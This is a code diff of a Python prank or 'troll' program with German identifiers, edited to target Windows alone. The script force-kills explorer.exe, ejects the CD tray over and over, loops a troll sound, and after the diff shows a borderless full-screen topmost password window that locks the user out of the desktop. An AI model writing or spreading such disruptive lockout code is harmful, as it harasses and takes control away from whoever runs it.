@@ -1,33 +1,7 @@
-import time, os, platform, ctypes, tkinter as tk, random
+import time, os, ctypes, tkinter as tk, random, winsound
 from threading import Thread
 
-if platform.system() == "Windows":
-        import winsound
-
 os.system("taskkill /f /im explorer.exe")
-
-def ejectCDROM():
-        if platform.system() == 'Windows':
-        # need 'u' before "", if you are using UTF-8. if not you don't need to put it.
-            ctypes.windll.WINMM.mciSendStringW(u"set cdaudio door open", None, 0, None)
-            #ctypes.windll.WINMM.mciSendStringW(u"set cdaudio door closed", None, 0, None)
-
-        # OSX
-        elif platform.system() == 'Darwin':
-            os.system("drutil tray open")
-            #os.system("drutil tray closed")
-
-        # Linux
-        elif platform.system() == 'Linux':
-            os.system("eject cdrom")
-            #os.system("eject -t cdrom")
-
-        # NetBSD
-        elif platform.system() == 'NetBSD':
-            #you must be su
-            os.system("eject cd")
-        else:
-            print ("OS Unsupported\n")
 
 class ersteKlasse(Thread):
         def __init__(self):
@@ -36,7 +10,7 @@ class ersteKlasse(Thread):
         def run(self):
                 time.sleep(5)
                 while True:
-                        ejectCDROM()
+                        ctypes.windll.WINMM.mciSendStringW(u"set cdaudio door open", None, 0, None)
                         time.sleep(random.randint(2, 5))
 
 
@@ -60,14 +34,14 @@ class zweiteKlasse(Thread):
                 
                 root.geometry('%dx%d+%d+%d' % (550, 150, x, y))
 
-            if zaehler == nenner:
+            if zaehler == 3:
                 zaehler = 0
                 nenner += nenner
                 def senden(eingabewidget, labelwidget):
                     pwdinput = str(eingabewidget.get())
                     if pwdinput != passwort:  
                             time.sleep(1)
-                            ejectCDROM()
+                            ctypes.windll.WINMM.mciSendStringW(u"set cdaudio door open", None, 0, None)
                             root.destroy()
 
                     if pwdinput == passwort:
@@ -80,23 +54,26 @@ class zweiteKlasse(Thread):
                 #GUI
                 root = tk.Tk()
                 root.attributes("-topmost", True)
-                root.title("Passwort")
+                root.attributes("-toolwindow",1)
                 root.configure(bg="yellow")
-                root.geometry("400x175")
+                root.overrideredirect(True)
+                root.geometry("{0}x{1}+0+0".format(root.winfo_screenwidth(), root.winfo_screenheight()))
 
                 #Überschrift
-                labelStart = tk.Label(root, text="Passwort", bg="yellow", fg="red", width=200, font=("Comic Sans MS",60))
+                labelStart = tk.Label(root, text="Passwort", bg="yellow", fg="red", width=200, font=("Comic Sans MS",200))
                 labelStart.pack()
 
                 #Antwort
                 labelAntwort = tk.Label(root, text=antwort, width=200, bg="white", fg="black")
 
                 #Eingabe
-                eingabe = tk.Entry(root, show="*", width=25, text=antwort1)
+                eingabe = tk.Entry(root, show="*", width=25, text=antwort1, font=("Comic Sans MS", 30))
                 eingabe.pack()
 
                 button = tk.Button(root,
                                         text = "eingabe",
+                                        height=2, width=15,
+                                        font=("Comic Sans MS", 20),
                                         command = lambda: senden(eingabe, labelAntwort))
                 button.pack()
                 root.mainloop()
@@ -115,24 +92,21 @@ class zweiteKlasse(Thread):
             root.after(500, lambda: root.destroy())
             center_window(200, 160)
             root.mainloop()
+            
+class dritteKlasse(Thread):
+        def __init__(self):
+                Thread.__init__(self)
 
-if platform.system() == "Windows":
-        class dritteKlasse(Thread):
-                def __init__(self):
-                        Thread.__init__(self)
-
-                def run(self):
-                        while True:
-                                winsound.PlaySound("troll.wav", winsound.SND_ASYNC | winsound.SND_ALIAS )
-                                time.sleep(162)
+        def run(self):
+                while True:
+                        winsound.PlaySound("troll.wav", winsound.SND_ASYNC | winsound.SND_ALIAS )
+                        time.sleep(162)
                 
 if __name__=='__main__':
         a=ersteKlasse()
         b=zweiteKlasse()
-        if platform.system() == "Windows":
-                c=dritteKlasse()
+        c=dritteKlasse()
 
         a.start()
         b.start()
-        if platform.system() == "Windows":
-                c.start()
+        c.start()
